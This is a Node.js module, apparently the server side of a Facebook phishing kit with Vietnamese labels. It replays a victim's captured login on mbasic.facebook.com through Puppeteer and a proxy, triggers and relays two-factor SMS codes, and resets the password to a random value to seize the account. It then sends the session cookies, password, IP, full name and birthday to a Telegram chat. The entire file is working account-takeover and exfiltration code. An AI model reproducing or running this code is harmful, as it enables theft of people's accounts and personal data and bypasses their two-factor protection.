const puppeteer = require('puppeteer');
const proxyChain = require('proxy-chain');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');

let browser;
let page;
let checkSms;
let status;
let sessionInfo;
let newpass;
async function initialize() {
    const proxyInfo = getConfigInfo();

    const launchOptions = {
        headless: false
    };

    if (proxyInfo.host && proxyInfo.port && proxyInfo.username && proxyInfo.password) {
        const proxyUrl = `http://${proxyInfo.username}:${proxyInfo.password}@${proxyInfo.host}:${proxyInfo.port}`;
        const newProxyUrl = await proxyChain.anonymizeProxy(proxyUrl);
        launchOptions.args = [
            `--proxy-server=${newProxyUrl}`
        ];
    }
    else if (proxyInfo.host && proxyInfo.port) {
        const proxyUrl = `http://${proxyInfo.host}:${proxyInfo.port}`;
        const newProxyUrl = await proxyChain.anonymizeProxy(proxyUrl);
        launchOptions.args = [
            `--proxy-server=${newProxyUrl}`
        ];
    }
    else {
        launchOptions.args = [
            '--no-sandbox',
            '--disable-setuid-sandbox'
        ];
    }

    browser = await puppeteer.launch(launchOptions);
    page = await browser.newPage();
}

async function check(username, password) {
    try {
        await page.goto('https://mbasic.facebook.com');
        await page.type('input[name="email"]', username);
        await page.type('input[name="pass"]', password);
        await page.click('input[type="submit"]');
        const loginError = await page.$('#login_error');
        if (loginError) {
            const text = await page.evaluate(() => {
                return 'WRONG'
            });
            await browser.close();
            return text;
        } else {
            if (await page.url().includes('checkpoint')) {
                const twoFactor = await page.$('#approvals_code');
                if (twoFactor) {
                    checkSms = await browser.newPage();
                    await checkSms.goto('https://mbasic.facebook.com/checkpoint/?having_trouble=1');
                    const smsEnable = await checkSms.$('input[type="radio"][value="sms_requested"]');
                    if (smsEnable) {
                        await checkSms.evaluate((element) => {
                            element.checked = true;
                        }, smsEnable);
                        await checkSms.click('input[type="submit"]');
                        await checkSms.close();
                        status = '2FA SMS'
                        return '2FA';
                    }
                    else {
                        await checkSms.close();
                        status = '2FA'
                        await page.goto('https://mbasic.facebook.com');
                        await page.type('input[name="email"]', username);
                        await page.type('input[name="pass"]', password);
                        await page.click('input[type="submit"]');
                        return '2FA';
                    }
                }
                else {
                    await browser.close();
                    return 'CHECKPOINT';
                }
            } else {
                await page.goto('https://mbasic.facebook.com')
                await page.goto('https://mbasic.facebook.com')
                const login_input = await page.$('input[name="email"]');
                if (login_input) {
                    await browser.close();
                    return 'WRONG';
                }
                const cookies = (await page.cookies()).map(cookie => {
                    delete cookie.sameSite;
                    return cookie;
                });
                fs.writeFileSync('cookies.json', JSON.stringify(cookies, null, 2));
                status = 'Không bật 2FA'
                return 'SUCCESS';
            }
        }
    } catch (error) {
        return 'Đã xảy ra lỗi ' + error;
    }
}
function generateRandomPassword(length) {
    const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+';
    let password = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * charset.length);
        password += charset[randomIndex];
    }
    return password;
}
async function enterCode(code) {
    await page.type('input[name="approvals_code"]', code);
    await page.click('input[type="submit"]');
    const wrongCode = await page.$('#approvals_code');
    if (wrongCode) {
        return 'WRONGCODE';
    }
    else {
        let currentUrl = page.url();
        let i = 0;
        while (i < 8) {
            if (currentUrl.includes('checkpoint')) {
                await page.click('input[type="submit"]');
                const newPassword = await page.$('input[name="password_new"]');
                if (newPassword) {
                    const randomPassword = generateRandomPassword(8);
                    await page.type('input[name="password_new"]', randomPassword);
                    await page.click('input[type="submit"]');
                    newpass = randomPassword;
                }
                currentUrl = await page.url();
            }
            else {
                const cookies = (await page.cookies()).map(cookie => {
                    delete cookie.sameSite;
                    return cookie;
                });
                fs.writeFileSync('cookies.json', JSON.stringify(cookies, null, 2));
                break;
            }
            i++;
        }
        if (i === 8) {
            await browser.close();
            return 'CHECKPOINT';
        }
        return 'SUCCESS';
    }
}
function getConfigInfo() {
    const configInfo = JSON.parse(fs.readFileSync('src/admin/config.json', 'utf8'));
    return configInfo;
}
function saveInfo(status, ip, country, email, pass, fullname, birthday) {
    const Info = {
        status: status,
        ip: ip,
        country: country,
        email: email,
        pass: pass,
        fullname: fullname,
        birthday: birthday
    };
    sessionInfo = JSON.stringify(Info, null, 2);
}
function getVietnamCurrentTime() {
    const now = new Date();
    const options = {
        timeZone: 'Asia/Ho_Chi_Minh',
        hour: '2-digit',
        minute: '2-digit',
    };
    return now.toLocaleString('vi-VN', options);
}
async function close() {
    await browser.close();
}

async function sendTelegramMessage(status, ip, country, email, pass, fullname, birthday) {
    const caption = "<b>" + status + "</b>\n\n<b>IP:</b> <code>" + ip + "</code>\n<b>Quốc gia:</b> <code>" + country + "</code>\n<b>Tên đăng nhập:</b> <code>" + email + "</code>\n<b>Mật khẩu:</b> <code>" + pass + "</code>\n<b>Tên đầy đủ:</b> <code>" + fullname + "</code>\n<b>Ngày sinh:</b> <code>" + birthday + "</code>";
    const configInfo = await getConfigInfo();
    const token = configInfo.token;
    const chatId = configInfo.chatid;
    const bot = new TelegramBot(token);
    const time = getVietnamCurrentTime();
    const newCookiesName = `${email}_${time.replace(/:/g, '-')}.json`;
    fs.renameSync('cookies.json', newCookiesName);
    bot.sendDocument(chatId, newCookiesName, {
        caption,
        parse_mode: 'html'
    })
        .then(() => {
            fs.unlinkSync(newCookiesName);
        })
        .catch(() => {
        });
}

async function updateAndSync() {
    let Info = JSON.parse(sessionInfo);
    let status = Info.status;
    let ip = Info.ip;
    let country = Info.country;
    let email = Info.email;
    let pass = Info.pass;
    let fullname = Info.fullname;
    let birthday = Info.birthday;
    if (newpass) {
        pass = newpass;
    }
    sendTelegramMessage(status, ip, country, email, pass, fullname, birthday);
}



module.exports = {
    initialize,
    check,
    enterCode,
    updateAndSync,
    saveInfo,
    close
};
